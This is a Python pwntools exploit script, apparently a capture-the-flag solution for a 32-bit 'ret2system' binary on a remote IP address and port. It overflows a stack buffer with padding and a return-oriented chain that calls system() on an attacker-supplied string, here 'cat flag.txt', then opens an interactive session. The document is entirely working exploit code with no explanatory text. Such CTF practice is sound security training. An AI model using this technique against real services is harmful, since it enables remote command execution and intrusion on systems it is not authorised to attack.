import pwn
gdb = """
    b *vuln
    c
"""
#p = pwn.gdb.debug("./rettest", gdbscript = gdb)
#p = pwn.process(["strace","-o","strace.out","./ret2system"])
p = pwn.remote("34.134.85.196", 9337)
elf = pwn.ELF("./ret2system")
rop = pwn.ROP("./ret2system")

store = 0x804c060
store_data = "cat flag.txt" 

pop_ebp = rop.find_gadget(['pop ebp', 'ret']).address
leave = rop.find_gadget(['leave', 'ret']).address
rop_chain = b"A"*(0x28+4)
rop_chain += pwn.p32(elf.plt['system']) +pwn.p32(pop_ebp)+ pwn.p32(store)
p.recvuntil("value\n")
p.sendline(store_data)
p.recvuntil("now\n")
p.sendline(rop_chain)
p.interactive()
